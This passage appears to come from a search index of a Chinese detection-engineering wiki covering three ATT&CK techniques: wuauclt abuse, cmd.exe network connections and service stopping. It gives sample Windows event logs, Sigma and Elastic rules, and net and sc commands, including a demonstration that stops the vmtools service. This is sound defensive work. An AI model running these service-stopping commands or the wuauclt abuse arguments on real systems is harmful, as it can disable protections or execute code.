Defender\u5e94\u7528\u7a0b\u5e8f\u63a7\u5236\uff08WDAC\uff09\uff0c\u53ef\u7528\u4e8e\u5728\u5df2\u7ecf\u53d7\u5230\u5a01\u80c1\u7684\u7cfb\u7edf\u4e0a\u83b7\u5f97\u6301\u4e45\u6027\u3002\u4e4b\u6240\u4ee5\u80fd\u591f\u53d1\u73b0\uff0c\u662f\u56e0\u4e3a\u4ed6\u53d1\u73b0\u5df2\u7ecf\u6709\u9ed1\u5ba2\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u6267\u884c\u653b\u51fb\u884c\u4e3a\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7\u3001\u5176\u4ed6EDR\u7c7b\u4ea7\u54c1</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b</p> <p>windows server 2016/win10</p> <pre><code>SourceSecurity\nLevelError\nDescriptionA new process has been created.\n\nCreator Subject:\nSecurity ID: SYSTEM\nAccount Name: -\nAccount Domain: -\nLogon ID: 0x3E7\n\nTarget Subject:\nSecurity ID: NULL SID\nAccount Name: -\nAccount Domain: -\nLogon ID: 0x0\n\nProcess Information:\nNew Process ID: 0x7b4\nNew Process Name: C:\\Windows\\System32\\lsass.exe\nToken Elevation Type: %%1936\nMandatory Label: Mandatory Label\\System Mandatory Level\nCreator Process ID: 0x71c\nCreator Process Name: C:\\Windows\\System32\\wininit.exe\nProcess Command Line: #\u9700\u8981\u5355\u72ec\u914d\u7f6e\uff0c\u5f00\u542f\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Windows Update Client\u6ee5\u7528\u68c0\u6d4b\nstatus: experimental\ndescription: Detects code execution via the Windows Update client (wuauclt)\nreferences:\n    - https://www.nruan.com/75037.html\ntags:\n    - attack.command_and_control\n    - attack.execution\n    - attack.t1105\n    - attack.t1218\nlogsource:\n    product: windows #windows\n    service: process_creation #\u5b89\u5168\u4e8b\u4ef6\uff0c\u8fdb\u7a0b\u521b\u5efa\ndetection:\n    selection:\n        ProcessCommandline|contains|all: #\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u5305\u542b\u4ee5\u4e0b\u4efb\u610f\u4e00\u9879\n            - '/UpdateDeploymentProvider'\n            - '/RunHandlerComServer'\n        Image|endswith: \n            - '\\wuauclt.exe' #\u8fdb\u7a0b\u8def\u5f84\u4e3a\u4ee5wuauclt.exe\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_6","title":"\u5efa\u8bae","text":"<p>\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u53ca\u5b50\u7236\u8fdb\u7a0b\uff0c\u5efa\u8bae\u901a\u8fc7sysmon\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1105</p> <p>https://attack.mitre.org/techniques/T1105</p> <p>Windows Update\u88ab\u53d1\u73b0\u53ef\u6ee5\u7528\u4e8e\u6267\u884c\u6076\u610f\u7a0b\u5e8f</p> <p>https://www.nruan.com/75037.html</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/","title":"T1105-win-\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5de5\u5177\u6216\u5176\u4ed6\u6587\u4ef6\u4ece\u5916\u90e8\u7cfb\u7edf\u8f6c\u79fb\u5230\u88ab\u653b\u9677\u7684\u73af\u5883\u4e2d\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053\u4ece\u5916\u90e8\u653b\u51fb\u8005\u63a7\u5236\u7684\u7cfb\u7edf\u4e2d\u590d\u5236\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5c06\u5de5\u5177\u5e26\u5165\u88ab\u653b\u9677\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u6216\u901a\u8fc7\u4e0e\u53e6\u4e00\u4e2a\u5de5\u5177\uff08\u5982FTP\uff09\u7684\u66ff\u4ee3\u534f\u8bae\u590d\u5236\u6587\u4ef6\u3002\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5728Mac\u548cLinux\u4e0a\u4f7f\u7528scp\u3001rsync\u548csftp\u7b49\u672c\u673a\u5de5\u5177\u8fdb\u884c\u590d\u5236\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u8bc6\u522bcmd.exe\u5efa\u7acb\u7f51\u7edc\u8fde\u63a5\u3002\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528cmd.exe\u4ece\u8fdc\u7a0bURL\u4e0b\u8f7d\u6216\u6267\u884c\u6076\u610f\u8f6f\u4ef6\u3002</p> <p>\u53c2\u8003\u6587\u7ae0\uff1a\u6e17\u900f\u6280\u5de7\u2014\u2014\u901a\u8fc7cmd\u4e0a\u4f20\u6587\u4ef6\u7684N\u79cd\u65b9\u6cd5</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b</p> <p>windows server 2016/win10</p> <pre><code>The Windows Filtering Platform has allowed a connection.\n\nApplication Information:\n\n   Process ID:  1752\n   Application Name: \\device\\harddiskvolume1\\windows\\system32\\dns.exe\n\nNetwork Information:\n\n   Direction:  Inbound\n   Source Address:  10.45.45.103\n   Source Port:  53\n   Destination Address: 10.45.45.103\n   Destination Port:  50146\n   Protocol:  17\n\nFilter Information:\n\n   Filter Run-Time ID: 5\n   Layer Name:  Receive/Accept\n   Layer Run-Time ID: 44\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4b\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5\ndescription: \u901a\u8fc7windows\u65e5\u5fd7\u547d\u4ee4\u68c0\u6d4b\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5\ntags: T1105\nstatus: experimental\nreferences:\n    - https://www.elastic.co/guide/en/siem/guide/current/command-prompt-network-connection.html#command-prompt-network-connection\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n          EventID: 5156\n          Process.name: 'cmd.exe' #Application Name\n    selection2:\n          Destination Address:\n                       - 10.0.0.0/8\n                       - 172.16.0.0/12\n                       - 192.168.0.0/16\n    condition: selection1 and not selection2\nlevel: low\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#elastic-rule-query","title":"Elastic rule query","text":"<pre><code>process.name:cmd.exe and event.action:\"Network connection detected\n(rule: NetworkConnect)\" and not destination.ip:(10.0.0.0/8 or\n172.16.0.0/12 or 192.168.0.0/16)\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_6","title":"\u5efa\u8bae","text":"<p>\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u53ca\u5b50\u7236\u8fdb\u7a0b\uff0c\u5efa\u8bae\u901a\u8fc7sysmon\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1105</p> <p>https://attack.mitre.org/techniques/T1105</p> <p>\u68c0\u6d4b\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5</p> <p>https://www.elastic.co/guide/en/siem/guide/current/command-prompt-network-connection.html#command-prompt-network-connection</p>"},{"location":"0xC_%E6%B8%97%E5%87%BA/","title":"Index","text":"<p>\u6682\u65e0</p>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/","title":"T1489-win-\u505c\u6b62\u670d\u52a1","text":""},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u505c\u6b62\u6216\u7981\u7528\u7cfb\u7edf\u4e0a\u7684\u670d\u52a1\uff0c\u4ee5\u4f7f\u5408\u6cd5\u7528\u6237\u65e0\u6cd5\u4f7f\u7528\u8fd9\u4e9b\u670d\u52a1\u3002\u505c\u6b62\u5173\u952e\u670d\u52a1\u53ef\u4ee5\u6291\u5236\u6216\u505c\u6b62\u8fd9\u4e9b\u670d\u52a1\u5bf9\u653b\u51fb\u8005\u5165\u4fb5\u76f8\u5173\u4e8b\u4ef6\u7684\u54cd\u5e94\uff0c\u6216\u8005\u5e2e\u52a9\u653b\u51fb\u8005\u5bf9\u7cfb\u7edf\u73af\u5883\u8fdb\u884c\u7834\u574f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u7981\u7528\u5bf9\u7ec4\u7ec7\u5f88\u91cd\u8981\u7684\u5355\u4e2a\u670d\u52a1\u6765\u5b9e\u73b0\u8fd9\u4e00\u76ee\u6807\uff0c\u4f8b\u5982MSExchangeIS\uff0c\u8fd9\u56de\u5bfc\u81f4Exchange\u5185\u5bb9\u65e0\u6cd5\u8bbf\u95ee\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u505c\u6b62\u6216\u7981\u7528\u8bb8\u591a\u6216\u6240\u6709\u670d\u52a1\uff0c\u4ece\u800c\u4f7f\u7cfb\u7edf\u65e0\u6cd5\u4f7f\u7528\u3002\u670d\u52a1\u53ef\u80fd\u4e0d\u5141\u8bb8\u5728\u8fd0\u884c\u65f6\u4fee\u6539\u5176\u5b58\u50a8\u7684\u6570\u636e\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u505c\u6b62\u670d\u52a1\uff0c\u4ece\u800c\u5bf9Exchange\u548cSQL Server\u7b49\u670d\u52a1\u7684\u5b58\u50a8\u6570\u636e\u8fdb\u884c\u9500\u6bc1\u6570\u636e\u548c\u52a0\u5bc6\u6570\u636e\u3002</p>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f7f\u7528Windows\u547d\u4ee4\u884c\u542f\u52a8\u5173\u95ed\u670d\u52a1(net,sc\u7528\u6cd5)\uff0c\u6700\u597d\u662f\u5728\u7ba1\u7406\u5458\u6743\u9650\u4e0b\u4f7f\u7528</p>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#net","title":"net\u7528\u4e8e\u6253\u5f00\u6ca1\u6709\u88ab\u7981\u7528\u7684\u670d\u52a1","text":"<p>NET\u547d\u4ee4\u662f\u529f\u80fd\u5f3a\u5927\u7684\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u6267\u884c\u7684\u5de5\u5177\u3002</p> <p>\u5b83\u5305\u542b\u4e86\u7ba1\u7406\u7f51\u7edc\u73af\u5883\u3001\u670d\u52a1\u3001\u7528\u6237\u3001\u767b\u9646\u5927\u90e8\u5206\u91cd\u8981\u7684\u7ba1\u7406\u529f\u80fd\uff0c\u5173\u4e8e\u8fd9\u4e9b\u529f\u80fd\u8fd9\u91cc\u4e0d\u518d\u4e00\u4e00\u8bb2\u89e3\uff0c\u5177\u4f53\u53ef\u53c2\u8003\u5fae\u8f6f\u5b98\u65b9\u8bf4\u660e\u3002</p> <p>\u542f\u52a8\u548c\u5173\u95ed\u670d\u52a1\u7684\u65f6\u5019\uff0c\u5176\u8bed\u6cd5\u662f\uff1a</p> <p>net start \u670d\u52a1\u540d</p> <p>net stop \u670d\u52a1\u540d</p>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#sc","title":"sc\u53ef\u7528\u4e8e\u6253\u5f00\u88ab\u7981\u7528\u7684\u670d\u52a1","text":"<p>\u4f7f\u7528sc\u7a0b\u5e8f(\u4e5f\u53ef\u4ee5\u67e5\u770b\u670d\u52a1\u72b6\u6001)\u53ef\u4ee5\u521b\u5efa\u670d\u52a1\u3001\u5220\u9664\u670d\u52a1\u3001\u6253\u5f00\u4e0e\u5173\u95ed\u670d\u52a1</p> <p>sc\u662f\u7528\u4e8e\u4e0e\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u548c\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\uff0c\u5176\u8bed\u6cd5\u662f\uff1a</p> <pre><code>sc config \u670d\u52a1\u540d start= demand     //\u624b\u52a8\n\nsc config \u670d\u52a1\u540d start= auto       //\u81ea\u52a8\n\nsc config \u670d\u52a1\u540d start= disabled //\u7981\u7528\n\nsc start \u670d\u52a1\u540d\u3000\u3000\u5f00\u542f\u670d\u52a1\n\nsc stop \u670d\u52a1\u540d\u3000\u3000\u505c\u6b62\u670d\u52a1\n\nsc query \u670d\u52a1\u540d\u3000\u3000\u67e5\u770b\u670d\u52a1\u72b6\u6001\n\n sc  delete  \u670d\u52a1\u540d    \u5220\u9664\u670d\u52a1\n\n sc qc \u670d\u52a1\u540d      \u67e5\u770b\u670d\u52a1\u7684\u914d\u7f6e\u4fe1\u606f\n\nsc create scname binPath=xxx.exe\u3000\u3000\u521b\u5efa\u670d\u52a1\n</code></pre>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u8fd9\u91cc\u53ea\u6f14\u793a\u4f7f\u7528net\u547d\u4ee4\u5173\u95ed\u670d\u52a1\uff0c\u5229\u7528sc\u547d\u4ee4\u5173\u95ed\u670d\u52a1\u7684\u65b9\u6cd5\uff0c\u5728\u8fd9\u91cc\u4e0d\u505a\u6f14\u793a\u3002</p> <pre><code>C:\\Users\\Administrator&gt;net stop vmtools\n\nVMware Tools \u670d\u52a1\u5df2\u6210\u529f\u505c\u6b62\u3002\n\nC:\\Users\\Administrator&gt;net start vmtools\nVMware Tools \u670d\u52a1\u6b63\u5728\u542f\u52a8 .\nVMware Tools \u670d\u52a1\u5df2\u7ecf\u542f\u52a8\u6210\u529f\u3002\n</code></pre> <p>\u901a\u8fc7\u89c2\u5bdf\u672c\u5730\u670d\u52a1\u4fe1\u606f\uff0c\u53d1\u73b0vmtools\u670d\u52a1\u5df2\u7ecf\u88ab\u5173\u95ed\u3002\u8bb0\u5f97\u662fnet stop\u540e\u9762\u8ddf\u7684\u662f\u670d\u52a1\u540d\u79f0\u3002</p>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p> <pre><code>\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  QAX\\Administrator\n \u5e10\u6237\u540d:  Administrator\n \u5e10\u6237\u57df:  QAX\n \u767b\u5f55 ID:  0x7169C\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0xd9c\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\net.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\High Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x15d0\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: net  stop vmtools\n</code></pre>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows\u4e0b\u4f7f\u7528net/sc\u547d\u4ee4\u5173\u95ed\u670d\u52a1\ndescription: Windows\u4e0b\u4f7f\u7528net stop/sc stop \u5173\u95ed\u670d\u52a1\uff0c\u7528\u4e8e\u9003\u907f\u76d1\u89c6\u3002\ntags: T1489\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa\n        Processcommandline|contains: \n            - 'net stop'  #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n            - 'sc stop' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_6","title":"\u5efa\u8bae","text":"<p>\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u7528\u4e8e\u67e5\u770b\u5173\u952e\u8fdb\u7a0b\u662f\u8fd0\u884c\u8fd8\u662f\u505c\u6b62\u8fd0\u884c\u3002</p>"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1489</p> <p>https://attack.mitre.org/techniques/T1489/</p> <p>\u4f7f\u7528Windows\u547d\u4ee4\u884c\u542f\u52a8\u5173\u95ed\u670d\u52a1(net,sc\u7528\u6cd5)</p> <p>https://www.cnblogs.com/qlqwjy/p/8010598.html</p>"}]}